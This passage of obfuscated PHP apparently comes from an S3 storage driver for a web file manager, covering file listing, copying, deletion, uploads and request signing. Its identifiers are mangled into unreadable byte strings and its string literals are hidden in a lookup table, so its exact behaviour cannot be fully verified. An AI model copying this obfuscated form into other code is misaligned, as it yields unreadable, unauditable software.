$this->getPathOuter($ú‹¨íˆ›[8] . $Şâ½İ‡ò . $ú‹¨íˆ›[8] . $®’İªğ¯), $ú‹¨íˆ›[78] => 1, $ú‹¨íˆ›[79] => 0); if (substr($®’İªğ¯, -1) != $ú‹¨íˆ›[8]) { $Ö¤ÌÁİ³[$ú‹¨íˆ›[78]] = 0; $œÌÃÏû¹ = $this->getPath($Şâ½İ‡ò . $ú‹¨íˆ›[8] . $®’İªğ¯); if (isset($µÎ©ÉüÛ[$œÌÃÏû¹])) { $Ñ—Ø‹‚® = $µÎ©ÉüÛ[$œÌÃÏû¹]; if (isset($Ñ—Ø‹‚®[$ú‹¨íˆ›[79]])) { $Ö¤ÌÁİ³[$ú‹¨íˆ›[79]] = intval($Ñ—Ø‹‚®[$ú‹¨íˆ›[79]]); } if (isset($Ñ—Ø‹‚®[$ú‹¨íˆ›[206]])) { $Ö¤ÌÁİ³[$ú‹¨íˆ›[88]] = intval($Ñ—Ø‹‚®[$ú‹¨íˆ›[206]]); } } } $©â²ÙŠ”[] = $Ö¤ÌÁİ³; } return $©â²ÙŠ”; } public function slicePath($ëÜğÍ‰æ) { $Ìì£ê =& $_SERVER[Ş­ğŠìÒ]; $ŠïÈ“µé = explode($Ìì£ê[8], trim($ëÜğÍ‰æ, $Ìì£ê[8])); $Ì‡Î÷ˆÁ = 0; do { ++$Ì‡Î÷ˆÁ; $Ø„Ùâ¯á[] = implode($Ìì£ê[8], array_slice($ŠïÈ“µé, 0, $Ì‡Î÷ˆÁ)) . $Ìì£ê[8]; } while ($Ì‡Î÷ˆÁ < count($ŠïÈ“µé)); $Ø„Ùâ¯á[count($ŠïÈ“µé) - 1] = $ëÜğÍ‰æ; return $Ø„Ùâ¯á; } public function getHost() { $ ¬Êîç• =& $_SERVER[Ş­ğŠìÒ]; $¸¦©ë = parse_url(trim($this->domain, $ ¬Êîç•[8])); $õÕì›¶¦ = isset($¸¦©ë[$ ¬Êîç•[207]]) ? $¸¦©ë[$ ¬Êîç•[207]] : http_type(); $­ûãó˜ş = isset($¸¦©ë[$ ¬Êîç•[208]]) ? $¸¦©ë[$ ¬Êîç•[208]] : $¸¦©ë[$ ¬Êîç•[87]]; if (isset($¸¦©ë[$ ¬Êîç•[209]])) { $­ûãó˜ş .= $ ¬Êîç•[4] . $¸¦©ë[$ ¬Êîç•[209]]; } return $õÕì›¶¦ . $ ¬Êîç•[210] . $­ûãó˜ş; } public function pathEncode($âªõ¸‹õ) { $Ù…‘ìÏ“ =& $_SERVER[Ş­ğŠìÒ]; return str_replace($Ù…‘ìÏ“[211], $Ù…‘ìÏ“[8], rawurlencode($âªõ¸‹õ)); } public function writeLog($”“İé© = '', $Ò™ñ£Â = false) { $½ˆıè¿¿ =& $_SERVER[Ş­ğŠìÒ]; $§Äºˆ¨² = in_array(ACTION, array($½ˆıè¿¿[212], $½ˆıè¿¿[213])); if (!$§Äºˆ¨² && !GLOBAL_DEBUG) { return; } $µí••œ = $”“İé©; static $Ã±ºÉÜß = null; if (!$Ã±ºÉÜß) { $Ã±ºÉÜß = strtoupper($this->getType()); } $”“İé© = $Ã±ºÉÜß . $½ˆıè¿¿[214] . $”“İé©; if ($Ò™ñ£Â) { $Ñé¡«Ã = error_get_last(); if ($Ñé¡«Ã) { $”“İé© = array($”“İé©, $Ñé¡«Ã); } } write_log($”“İé©, $½ˆıè¿¿[215]); if ($§Äºˆ¨²) { throw new Exception($µí••œ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Æó™Öê„) { set_timeout(); require_once SDK_DIR . $_SERVER[Ş­ğŠìÒ][216]; parent::__construct(); $this->_init($Æó™Öê„); } public function _init($”Ã¶Èö’) { $ÑÅØÀÙ‚ =& $_SERVER[Ş­ğŠìÒ]; $this->config = $”Ã¶Èö’; foreach ($”Ã¶Èö’ as $ËÃ’­Ä => $ıÆ…¸) { if (isset($this->{$ËÃ’­Ä})) { $this->{$ËÃ’­Ä} = $ıÆ…¸; } } $this->endpoint = $”Ã¶Èö’[$ÑÅØÀÙ‚[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ÑÅØÀÙ‚[212], $ÑÅØÀÙ‚[213]))) { $this->client->setExceptions(); } } public function setSignVersion($õÌŸğ = "\166\64") { $this->signVer = $õÌŸğ; $this->client->setSignatureVersion($õÌŸğ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ÇôËú®ø) { return null; } } public function isBucketCors() { $»÷âÓàí =& $_SERVER[Ş­ğŠìÒ]; $ùƒ›”ƒó = $this->getBucketCors(); if (!$ùƒ›”ƒó || !is_array($ùƒ›”ƒó)) { return !1; } if (!is_array($ùƒ›”ƒó[$»÷âÓàí[218]])) { $ùƒ›”ƒó[$»÷âÓàí[218]] = explode($»÷âÓàí[50], $ùƒ›”ƒó[$»÷âÓàí[218]]); } if ($ùƒ›”ƒó[$»÷âÓàí[219]] != $»÷âÓàí[220] || !in_array($»÷âÓàí[220], $ùƒ›”ƒó[$»÷âÓàí[218]])) { return !1; } $¶‚Ê¤èã = array_map($»÷âÓàí[221], $ùƒ›”ƒó[$»÷âÓàí[222]]); if (!is_array($¶‚Ê¤èã)) { $¶‚Ê¤èã = array(); } $Ê‹ƒË¥õ = array($»÷âÓàí[223], $»÷âÓàí[224], $»÷âÓàí[225], $»÷âÓàí[226], $»÷âÓàí[227]); $èˆÍüÑ = array_diff($Ê‹ƒË¥õ, $¶‚Ê¤èã); return empty($èˆÍüÑ); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($©Ù¸¤óó, $æ®øïá = '', $Õ…‡­­§ = REPEAT_RENAME) { $ô™ı“Î = $this->setContent($©Ù¸¤óó, $æ®øïá); if ($ô™ı“Î !== !1) { return $this->getPathOuter($©Ù¸¤óó); } return !1; } public function mkdir($ø˜Öøˆ, $Ç‘êÚ˜ = REPEAT_SKIP) { $Òàêìû‹ =& $_SERVER[Ş­ğŠìÒ]; if (empty($ø˜Öøˆ) && $ø˜Öøˆ !== $Òàêìû‹[228]) { return !1; } if ($Ç‘êÚ˜ && $this->_isFolder($ø˜Öøˆ)) { return $this->getPathOuter($ø˜Öøˆ); } $ÂÈÓ¨‘ = $this->setContent($ø˜Öøˆ, $Òàêìû‹[12], !0); if ($ÂÈÓ¨‘ !== !1) { return $this->getPathOuter($ø˜Öøˆ); } return !1; } public function copyFile($ì¼ëÆË¨, $ÔõÛıÒ, $¥œ‡³Ö’ = array()) { $¾‰ßâÖ¾ =& $_SERVER[Ş­ğŠìÒ]; $—İ°óûó = $this->objectMeta($ì¼ëÆË¨); if (!$—İ°óûó) { return !1; } if ($—İ°óûó[$¾‰ßâÖ¾[79]] <= 1024 * 1024 * 200) { $êñ«µÍ = $this->client->copyObject($this->bucket, $ì¼ëÆË¨, $this->bucket, $ÔõÛıÒ, $¾‰ßâÖ¾[229], $¥œ‡³Ö’); } else { $êñ«µÍ = $this->client->multiCopyObject($this->bucket, $ì¼ëÆË¨, $this->bucket, $ÔõÛıÒ, $¥œ‡³Ö’); } $êñ«µÍ = $êñ«µÍ ? $this->getPathOuter($ÔõÛıÒ) : !1; return $êñ«µÍ; } public function moveFile($Ğù½şçõ, $€°©Ëë) { if ($this->copyFile($Ğù½şçõ, $€°©Ëë)) { $this->delFile($Ğù½şçõ); return $this->getPathOuter($€°©Ëë); } return !1; } public function delFile($ÉÕŞãú­) { return $this->client->deleteObject($this->bucket, $ÉÕŞãú­); } public function delFolder($¼·úÊÙÇ) { $•Ã»À½Ê =& $_SERVER[Ş­ğŠìÒ]; if (!$this->exist($¼·úÊÙÇ)) { return !0; } $this->listItemCache = !1; $«¢›Íã¶ = $this->fileList($¼·úÊÙÇ); $this->listItemCache = !0; $¶íŒ¸‹¼ = trim($¼·úÊÙÇ, $•Ã»À½Ê[8]) . $•Ã»À½Ê[8]; if (!empty($¼·úÊÙÇ) && $¼·úÊÙÇ !== $•Ã»À½Ê[228] && !in_array($¶íŒ¸‹¼, $«¢›Íã¶[$•Ã»À½Ê[85]])) { $«¢›Íã¶[$•Ã»À½Ê[85]][] = $¶íŒ¸‹¼; } $ÓŠÛÎ÷ = $this->delByBatch($«¢›Íã¶[$•Ã»À½Ê[86]]); if (!$ÓŠÛÎ÷) { return !1; } $ÓŠÛÎ÷ = $this->delByBatch($«¢›Íã¶[$•Ã»À½Ê[85]]); if (!$ÓŠÛÎ÷) { return !1; } return $this->delFile($¶íŒ¸‹¼); } private function delByBatch($—â…íË¹) { foreach (array_chunk($—â…íË¹, 1000) as $†ÄÕå¸“) { $äÌÎı°ƒ = $this->client->deleteObjects($this->bucket, $†ÄÕå¸“); if (!$äÌÎı°ƒ) { return !1; } } return !0; } public function rename($¼ªÚËïØ, $Úû¿ïÏ) { return $this->renameObject($¼ªÚËïØ, $Úû¿ïÏ); } public function listPath($“ÜóÌ, $î‚´ñ´Œ = false) { $±ô Á =& $_SERVER[Ş­ğŠìÒ]; $Œª“ = $this->fileList($“ÜóÌ, $±ô Á[8], !0); foreach ($Œª“[$±ô Á[85]] as $šˆñ´ƒ† => $·‰¿ùğ¢) { $Œª“[$±ô Á[85]][$šˆñ´ƒ†] = $this->folderInfo($·‰¿ùğ¢, $î‚´ñ´Œ, $·‰¿ùğ¢); } foreach ($Œª“[$±ô Á[86]] as $šˆñ´ƒ† => $·‰¿ùğ¢) { $Œª“[$±ô Á[86]][$šˆñ´ƒ†] = $this->fileInfo($·‰¿ùğ¢[$±ô Á[32]], $î‚´ñ´Œ, $·‰¿ùğ¢); } return $Œª“; } protected function infoChildren($¯‡ÖÆ¶¹, &$¿ì…‘) { $ˆíÓĞÅ =& $_SERVER[Ş­ğŠìÒ]; $Å¿é«ğ¯ = $this->fileList($¯‡ÖÆ¶¹, $ˆíÓĞÅ[12], !0); $¿ì…‘[$ˆíÓĞÅ[81]] += count($Å¿é«ğ¯[$ˆíÓĞÅ[85]]); $¿ì…‘[$ˆíÓĞÅ[80]] += count($Å¿é«ğ¯[$ˆíÓĞÅ[86]]); foreach ($Å¿é«ğ¯[$ˆíÓĞÅ[86]] as $œàõÛĞ¹) { if (!$œàõÛĞ¹ || !$œàõÛĞ¹[$ˆíÓĞÅ[79]]) { continue; } $¿ì…‘[$ˆíÓĞÅ[79]] += $œàõÛĞ¹[$ˆíÓĞÅ[79]]; } } private function fileInfo($÷ÛÒ÷Íè, $¯¤ŞÜª = false, $Ó¼˜çîÅ = array()) { $­‰Âİ¿ò =& $_SERVER[Ş­ğŠìÒ]; $ì·­­¹– = array($­‰Âİ¿ò[32] => $this->pathThis($÷ÛÒ÷Íè), $­‰Âİ¿ò[87] => $this->getPathOuter($÷ÛÒ÷Íè), $­‰Âİ¿ò[33] => $­‰Âİ¿ò[230], $­‰Âİ¿ò[169] => $this->ext($÷ÛÒ÷Íè), $­‰Âİ¿ò[79] => isset($Ó¼˜çîÅ[$­‰Âİ¿ò[79]]) ? $Ó¼˜çîÅ[$­‰Âİ¿ò[79]] : 0); if ($¯¤ŞÜª) { return $ì·­­¹–; } $ì·­­¹–[$­‰Âİ¿ò[231]] = $ì·­­¹–[$­‰Âİ¿ò[88]] = 0; $ì·­­¹–[$­‰Âİ¿ò[232]] = $ì·­­¹–[$­‰Âİ¿ò[233]] = !0; if (empty($Ó¼˜çîÅ)) { $Ó¼˜çîÅ = $this->objectMeta($÷ÛÒ÷Íè); if (!$Ó¼˜çîÅ) { return $ì·­­¹–; } } if (isset($Ó¼˜çîÅ[$­‰Âİ¿ò[234]]) && $Ó¼˜çîÅ[$­‰Âİ¿ò[234]]) { $ì·­­¹–[$­‰Âİ¿ò[235]] = $Ó¼˜çîÅ[$­‰Âİ¿ò[234]]; } if (isset($Ó¼˜çîÅ[$­‰Âİ¿ò[206]])) { $ì·­­¹–[$­‰Âİ¿ò[88]] = $Ó¼˜çîÅ[$­‰Âİ¿ò[206]]; } if (isset($Ó¼˜çîÅ[$­‰Âİ¿ò[79]])) { $ì·­­¹–[$­‰Âİ¿ò[79]] = $Ó¼˜çîÅ[$­‰Âİ¿ò[79]]; } return $ì·­­¹–; } private function folderInfo($Š“ÊŒøÃ, $éÔ¦ö›‹ = false, $ÍÙºªøÌ = array()) { $Àˆ’‡™… =& $_SERVER[Ş­ğŠìÒ]; $ÊÚšåò = array($Àˆ’‡™…[32] => $this->pathThis($Š“ÊŒøÃ), $Àˆ’‡™…[87] => $this->getPathOuter($Àˆ’‡™…[8] . $Š“ÊŒøÃ), $Àˆ’‡™…[33] => $Àˆ’‡™…[78]); if ($éÔ¦ö›‹) { return $ÊÚšåò; } $ÊÚšåò[$Àˆ’‡™…[231]] = $ÊÚšåò[$Àˆ’‡™…[88]] = 0; $ÊÚšåò[$Àˆ’‡™…[232]] = $ÊÚšåò[$Àˆ’‡™…[233]] = !0; if ($Š“ÊŒøÃ == $Àˆ’‡™…[12]) { return $ÊÚšåò; } if (empty($ÍÙºªøÌ)) { $ÍÙºªøÌ = $this->objectMeta(trim($Š“ÊŒøÃ, $Àˆ’‡™…[8]) . $Àˆ’‡™…[8]); } if (isset($ÍÙºªøÌ[$Àˆ’‡™…[206]])) { $ÊÚšåò[$Àˆ’‡™…[231]] = $ÍÙºªøÌ[$Àˆ’‡™…[206]]; } return $ÊÚšåò; } private function fileList($ìíøó˜, $¾üÎ¹Ä’ = '', $¶²ˆ×¾Á = 0) { $”Å²„à =& $_SERVER[Ş­ğŠìÒ]; $Áíûæ = rtrim($ìíøó˜, $”Å²„à[8]) . $”Å²„à[8]; $Ãæñ³ = $this->listObjs($Áíûæ, null, null, $¾üÎ¹Ä’); if (!$Ãæñ³) { return array($”Å²„à[85] => array(), $”Å²„à[86] => array()); } $š¨Â ² = $±à€‚¤å = array(); foreach ($Ãæñ³[$”Å²„à[236]] as $¹Ë’àó) { $ºÖö‡éÖ = $¹Ë’àó[$”Å²„à[32]]; if ($ºÖö‡éÖ == $Áíûæ) { continue; } $îî»ªÅ = isset($¹Ë’àó[$”Å²„à[79]]) ? $¹Ë’àó[$”Å²„à[79]] : 0; $Ğ™‡ = $îî»ªÅ == 0 && substr($ºÖö‡éÖ, strlen($ºÖö‡éÖ) - 1, 1) == $”Å²„à[8] ? !0 : !1; $this->cacheMethodInfoSet($ºÖö‡éÖ, $Ğ™‡, $¹Ë’àó); if ($Ğ™‡) { $š¨Â ²[] = $ºÖö‡éÖ; continue; } $±à€‚¤å[] = $¶²ˆ×¾Á ? $¹Ë’àó : $ºÖö‡éÖ; } foreach ($Ãæñ³[$”Å²„à[237]] as $¹Ë’àó) { $š¨Â ²[] = $¹Ë’àó[$”Å²„à[32]]; $this->cacheMethodInfoSet($¹Ë’àó[$”Å²„à[32]], !0); } $this->cacheMethodInfoSet($ìíøó˜, !0); return array($”Å²„à[85] => $š¨Â ², $”Å²„à[86] => $±à€‚¤å); } private function listObjs($ª½©µÊ, $“§äº›‚ = null, $Ê€÷ßŠÊ = null, $ìé„½¶• = null) { $’è€”¦ =& $_SERVER[Ş­ğŠìÒ]; $ª½©µÊ = trim($ª½©µÊ, $’è€”¦[8]); $ÉÂ”†ê¤ = empty($ª½©µÊ) && $ª½©µÊ !== $’è€”¦[228] ? $’è€”¦[12] : $ª½©µÊ . $’è€”¦[8]; return $this->client->getBucket($this->bucket, $ÉÂ”†ê¤, $“§äº›‚, $Ê€÷ßŠÊ, $ìé„½¶•, !0); } public function has($Éºó‡ÅÒ, $©üíšºÑ = false, $½«—èŞÉ = true) { $ãõÒó‰Š =& $_SERVER[Ş­ğŠìÒ]; $Éºó‡ÅÒ = trim($Éºó‡ÅÒ, $ãõÒó‰Š[8]); $º¥´ì³ = empty($Éºó‡ÅÒ) && $Éºó‡ÅÒ !== $ãõÒó‰Š[228] ? $ãõÒó‰Š[12] : $Éºó‡ÅÒ . $ãõÒó‰Š[8]; $½ÃéÏ½ = null; $‰¹­ø€Ö = 500; $â˜¸²Â¥ = $ãõÒó‰Š[8]; $›¦Ã» = $ï‡ÖÓ·¦ = array(); while (!0) { $ò™Şïæ = $this->listObjs($Éºó‡ÅÒ, $½ÃéÏ½, $‰¹­ø€Ö, $â˜¸²Â¥); if (!$ò™Şïæ) { break; } $½ÃéÏ½ = $ò™Şïæ[$ãõÒó‰Š[238]]; $Û¤õ¯†è = $ò™Şïæ[$ãõÒó‰Š[236]]; $‰ì†¼™Ù = $ò™Şïæ[$ãõÒó‰Š[237]]; if (empty($Û¤õ¯†è) && empty($‰ì†¼™Ù)) { break; } if (count($Û¤õ¯†è) == 1 && $Û¤õ¯†è[0][$ãõÒó‰Š[32]] == $º¥´ì³) { break; } if ($©üíšºÑ) { if (count($Û¤õ¯†è)) { $Û¤õ¯†è = array_column($Û¤õ¯†è, $ãõÒó‰Š[32]); $›¦Ã» = array_merge($›¦Ã», $Û¤õ¯†è); } if (count($‰ì†¼™Ù)) { $‰ì†¼™Ù = array_column($‰ì†¼™Ù, $ãõÒó‰Š[32]); $ï‡ÖÓ·¦ = array_merge($ï‡ÖÓ·¦, $‰ì†¼™Ù); } if ($½ÃéÏ½ === null) { break; } continue; } if ($½«—èŞÉ) { if (!empty($Û¤õ¯†è)) { if (count($Û¤õ¯†è) > 1 || isset($Û¤õ¯†è[0][$ãõÒó‰Š[32]]) && $Û¤õ¯†è[0][$ãõÒó‰Š[32]] != $º¥´ì³) { return !0; } } } else { if (!empty($‰ì†¼™Ù)) { return !0; } } if ($½ÃéÏ½ === null) { break; } } if ($©üíšºÑ) { $›¦Ã» = array_diff($›¦Ã», array($º¥´ì³)); $›¦Ã» = count(array_unique($›¦Ã»)); $ï‡ÖÓ·¦ = count(array_unique($ï‡ÖÓ·¦)); return array($ãõÒó‰Š[239] => $›¦Ã», $ãõÒó‰Š[240] => $ï‡ÖÓ·¦); } return !1; } public function listAll($›¸®–½ê) { $èüó¥Ø­ =& $_SERVER[Ş­ğŠìÒ]; $®’ñí¿Ö = $this->fileList($›¸®–½ê, $èüó¥Ø­[12], !0); $äÉå–… = array_to_keyvalue($®’ñí¿Ö[$èüó¥Ø­[86]], $èüó¥Ø­[32]); foreach ($®’ñí¿Ö[$èüó¥Ø­[85]] as $¼·µšã«) { if (is_string($¼·µšã«)) { $äÉå–…[$¼·µšã«] = array($èüó¥Ø­[79] => 0); } } return $this->listAllFiles($›¸®–½ê, $äÉå–…); } public function canRead($üìÛù‚¹) { $ß°­©•° =& $_SERVER[Ş­ğŠìÒ]; $‹ƒ‚Ñğ = $this->client->getAccessControlPolicy($this->bucket, $üìÛù‚¹); if (!$‹ƒ‚Ñğ) { return !1; } return in_array($‹ƒ‚Ñğ, array($ß°­©•°[241], $ß°­©•°[242], $ß°­©•°[243])) ? !0 : !1; } public function canWrite($ßŞÕ©´É) { $–Šô´¾˜ =& $_SERVER[Ş­ğŠìÒ]; $ÖÆğãû× = $this->client->getAccessControlPolicy($this->bucket, $ßŞÕ©´É); if (!$ÖÆğãû×) { return !1; } return in_array($ÖÆğãû×, array($–Šô´¾˜[241], $–Šô´¾˜[242])) ? !0 : !1; } public function getContent($É´·Ì¶´) { return $this->client->getObject($this->bucket, $É´·Ì¶´); } public function setContent($Ÿæè¾ªÍ, $¹Ïäæ¤Ğ = '', $ŠøœÀ¯ = false) { $Š÷ş›”Ü =& $_SERVER[Ş­ğŠìÒ]; $Ÿæè¾ªÍ = $ŠøœÀ¯ ? trim($Ÿæè¾ªÍ, $Š÷ş›”Ü[8]) . $Š÷ş›”Ü[8] : $Ÿæè¾ªÍ; $òÓÊÌĞ = get_file_mime(get_path_ext($Ÿæè¾ªÍ)); $°”§ÙÔ‹ = $this->client->putObject($¹Ïäæ¤Ğ, $this->bucket, $Ÿæè¾ªÍ, $Š÷ş›”Ü[229], array(), $òÓÊÌĞ); if (!$°”§ÙÔ‹) { return !1; } if ($ŠøœÀ¯) { return !0; } return $°”§ÙÔ‹ ? !0 : !1; } public function fileSubstr($«Û™œÃ, $ÖƒÃÅÙ§, $·©¤Çê€) { $Ğ³ıË£ = $ÖƒÃÅÙ§ + $·©¤Çê€ - 1; return $this->client->getObject($this->bucket, $«Û™œÃ, array($_SERVER[Ş­ğŠìÒ][244] => "\x62\x79\x74\145\x73\75{$ÖƒÃÅÙ§}\x2d{$Ğ³ıË£}")); } public function upload($‰Èò…Ö·, $ñ Çİã, $”ËËÜšï = false, $Çãïš ° = REPEAT_REPLACE) { $±ÚĞÅàÁ =& $_SERVER[Ş­ğŠìÒ]; $İæ™¦ÚŞ = array($±ÚĞÅàÁ[245] => @md5_file($ñ Çİã)); $£ˆ¡òÁ£ = array($±ÚĞÅàÁ[246] => get_file_mime(get_path_ext($‰Èò…Ö·))); if (IO::size($ñ Çİã) <= 1024 * 1024 * 200) { $ç¯í©çâ = $this->client->putObjectFile($ñ Çİã, $this->bucket, $‰Èò…Ö·, $±ÚĞÅàÁ[229], $İæ™¦ÚŞ, $£ˆ¡òÁ£); return !empty($ç¯í©çâ) ? $this->getPathOuter($‰Èò…Ö·) : !1; } $§­ ÑŸ™ = $this->client->multiUploadObject($ñ Çİã, $this->bucket, trim($‰Èò…Ö·, $±ÚĞÅàÁ[8]), $İæ™¦ÚŞ, $£ˆ¡òÁ£); return $§­ ÑŸ™ ? $this->getPathOuter($‰Èò…Ö·) : !1; } public function download($Ç¬—Ü¸, $Ôˆæ¶Íı) { if (!@is_dir($this->pathFather($Ôˆæ¶Íı)) && !IO::mkdir($this->pathFather($Ôˆæ¶Íı))) { return !1; } $µéœŒì‡ = $this->client->getObject($this->bucket, $Ç¬—Ü¸, array(), $Ôˆæ¶Íı); return $µéœŒì‡ !== !1 ? $Ôˆæ¶Íı : !1; } public function link($µƒ±Ÿ€€, $Òïò…Õ£ = array()) { $Ü¢ªûµ‰ =& $_SERVER[Ş­ğŠìÒ]; if ($this->signVer == $Ü¢ªûµ‰[247]) { return $this->client->getAuthenticatedURL($this->bucket, $µƒ±Ÿ€€, 3600 * 12, $Òïò…Õ£); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($µƒ±Ÿ€€, $Ü¢ªûµ‰[8]), 3600 * 12, $this->region, array(), !0, $Òïò…Õ£); } public function fileOut($ßİ›½¹Ö, $÷ŠÜ’µ© = false, $›Ì÷ë§Ä = false, $¨Â²åŸ½ = '') { $¢­î’Æ³ =& $_SERVER[Ş­ğŠìÒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ßİ›½¹Ö, $÷ŠÜ’µ©, $›Ì÷ë§Ä, $¨Â²åŸ½); } if (!$›Ì÷ë§Ä) { $›Ì÷ë§Ä = $this->pathThis($ßİ›½¹Ö); } $ œ®Åœä = get_file_mime(get_path_ext($›Ì÷ë§Ä)); if ($ œ®Åœä == $¢­î’Æ³[248]) { return parent::fileOut($ßİ›½¹Ö, $÷ŠÜ’µ©, $›Ì÷ë§Ä, $¨Â²åŸ½); } $øÜ°´¨é = array($¢­î’Æ³[249] => $ œ®Åœä); if ($÷ŠÜ’µ©) { $øÜ°´¨é[$¢­î’Æ³[250]] = $¢­î’Æ³[251] . rawurlencode($›Ì÷ë§Ä); } else { } $È½Ó—¦› = $this->link($ßİ›½¹Ö, $øÜ°´¨é); $this->fileOutLink($È½Ó—¦›); } public function fileOutServer($–’§¹ , $­£¿Å« = false, $•Ğ¥® = false, $İ“á¹‹ş = '') { parent::fileOut($–’§¹ , $­£¿Å«, $•Ğ¥®, $İ“á¹‹ş); } public function fileOutImageServer($Öø ¸®è, $ˆÛË¢ìÆ = 250) { parent::fileOutImage($Öø ¸®è, $ˆÛË¢ìÆ); } public function hashMd5($¼’œ’Á, $¾È‡ò„° = '') { $˜Ê”Ó¾³ = $this->objectMeta($¼’œ’Á); if (!$˜Ê”Ó¾³) { return !1; } $¾È‡ò„° = $¾È‡ò„° ? $¾È‡ò„° : _get($˜Ê”Ó¾³, $_SERVER[Ş­ğŠìÒ][252]); return $¾È‡ò„°; } public function uploadFormData($—€—·ŠË, $ŸàÔÚ = 3600) { $¸Å½¿óé =& $_SERVER[Ş­ğŠìÒ]; $€Ö»æéı = $this->pathFather($—€—·ŠË); $ÂªÒíæ’ = $this->client->getHttpUploadPostParams($this->bucket, $€Ö»æéı, $¸Å½¿óé[229], $ŸàÔÚ); return array_merge((array) $ÂªÒíæ’, array($¸Å½¿óé[208] => $this->getHost())); } public function multiUploadFormData($»¬°óİ, $é¡ò²†¬ = 3600) { $òçòŸô´ =& $_SERVER[Ş­ğŠìÒ]; $€š˜ñÚ½ = gmdate($òçòŸô´[253]); $ª»È±· = array(); $ÂÃ†ú¿µ = $this->client->getUploadId($this->bucket, $»¬°óİ, $ª»È±·); if (!$ÂÃ†ú¿µ) { return !1; } return array($òçòŸô´[254] => $ÂÃ†ú¿µ, $òçòŸô´[208] => $this->getHost() . $òçòŸô´[8] . $this->pathEncode($»¬°óİ), $òçòŸô´[255] => $€š˜ñÚ½, $òçòŸô´[97] => $»¬°óİ); } public function multiUploadAuthData($Àœ‹¸Ñ‘, $ˆ·‰çê = array()) { $Î®ò¼øŸ =& $_SERVER[Ş­ğŠìÒ]; $ºäŒ´ª = isset($ˆ·‰çê[$Î®ò¼øŸ[255]]) ? $ˆ·‰çê[$Î®ò¼øŸ[255]] : gmdate($Î®ò¼øŸ[253]); $ëà€£ = isset($ˆ·‰çê[$Î®ò¼øŸ[169]]) ? $ˆ·‰çê[$Î®ò¼øŸ[169]] : $Î®ò¼øŸ[12]; $Úƒ§êû‰ = $ˆ·‰çê[$Î®ò¼øŸ[97]]; unset($ˆ·‰çê[$Î®ò¼øŸ[97]]); if (isset($ˆ·‰çê[$Î®ò¼øŸ[256]])) { $ˆ·‰çê[$Î®ò¼øŸ[255]] = $ºäŒ´ª; return $this->listUploadParts($Úƒ§êû‰, $ˆ·‰çê); } $€¤¹üËİ = array($Î®ò¼øŸ[257], $Î®ò¼øŸ[12], $Î®ò¼øŸ[123], $Î®ò¼øŸ[12], "\x78\55\x61\155\172\x2d\x64\141\x74\145\72{$ºäŒ´ª}", $Î®ò¼øŸ[8] . $this->bucket . $Î®ò¼øŸ[8] . $this->pathEncode($Úƒ§êû‰) . $ëà€£); if (strpos($ëà€£, $Î®ò¼øŸ[258]) === 0) { $€¤¹üËİ[0] = $Î®ò¼øŸ[259]; } if (isset($ˆ·‰çê[$Î®ò¼øŸ[260]]) && $ˆ·‰çê[$Î®ò¼øŸ[260]] == $Î®ò¼øŸ[261]) { $€¤¹üËİ[0] = $Î®ò¼øŸ[261]; } $­şÓãú = implode($Î®ò¼øŸ[262], $€¤¹üËİ); $È†‰¢§ = base64_encode(hash_hmac($Î®ò¼øŸ[263], $­şÓãú, $this->secret, !0)); $¾çúÏ‰Ô = $Î®ò¼øŸ[264] . $this->accessKey . $Î®ò¼øŸ[4] . $È†‰¢§; if (strpos($ëà€£, $Î®ò¼øŸ[258]) === 0) { return array($Î®ò¼øŸ[265] => $¾çúÏ‰Ô, $Î®ò¼øŸ[255] => $ºäŒ´ª); } return $¾çúÏ‰Ô; } public function listUploadParts($¯§·îÎ, $ÌÒµÍâ¹ = array()) { $ÖÛ§ÌÇ· =& $_SERVER[Ş­ğŠìÒ]; $…‡Ÿ±‹† = str_replace($ÖÛ§ÌÇ·[266], $ÖÛ§ÌÇ·[12], $ÌÒµÍâ¹[$ÖÛ§ÌÇ·[169]]); $®äêñãÅ = $this->client->listParts($this->bucket, $¯§·îÎ, $…‡Ÿ±‹†); if (!$®äêñãÅ) { return !1; } unset($ÌÒµÍâ¹[$ÖÛ§ÌÇ·[256]], $ÌÒµÍâ¹[$ÖÛ§ÌÇ·[260]]); $ÌÒµÍâ¹[$ÖÛ§ÌÇ·[97]] = $¯§·îÎ; $¨àúíıÇ = $this->multiUploadAuthData($¯§·îÎ, $ÌÒµÍâ¹); if (empty($¨àúíıÇ)) { return !1; } return array($ÖÛ§ÌÇ·[265] => $¨àúíıÇ, $ÖÛ§ÌÇ·[255] => $ÌÒµÍâ¹[$ÖÛ§ÌÇ·[255]], $ÖÛ§ÌÇ·[267] => $®äêñãÅ); } public function getHost() { $ÛãÈ»†Ô =& $_SERVER[Ş­ğŠìÒ]; $ÀĞ‰È«¨ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÛãÈ»†Ô[70], $ÛãÈ»†Ô[64], $ÛãÈ»†Ô[69], $ÛãÈ»†Ô[62]))) { return $ÀĞ‰È«¨ . $ÛãÈ»†Ô[8] . $this->bucket; } $ÀĞ‰È«¨ = explode($ÛãÈ»†Ô[210], $ÀĞ‰È«¨); return $ÀĞ‰È«¨[0] . $ÛãÈ»†Ô[210] . $this->bucket . $ÛãÈ»†Ô[10] . $ÀĞ‰È«¨[1]; } public function size($‘Ÿ©) { $¤¼¾ªÀ„ = $this->objectMeta($‘Ÿ©); return $¤¼¾ªÀ„ ? $¤¼¾ªÀ„[$_SERVER[Ş­ğŠìÒ][79]] : 0; } public function info($ÃÑÀóÙÚ) { if ($this->isFolder($ÃÑÀóÙÚ)) { return $this->folderInfo($ÃÑÀóÙÚ); } else { if ($this->isFile($ÃÑÀóÙÚ)) { return $this->fileInfo($ÃÑÀóÙÚ); } } return !1; } public function exist($ª€—‚ûß) { return $this->isFile($ª€—‚ûß) || $this->isFolder($ª€—‚ûß); } public function isFile($ıãßıÒà) { return !$this->isFolder($ıãßıÒà) 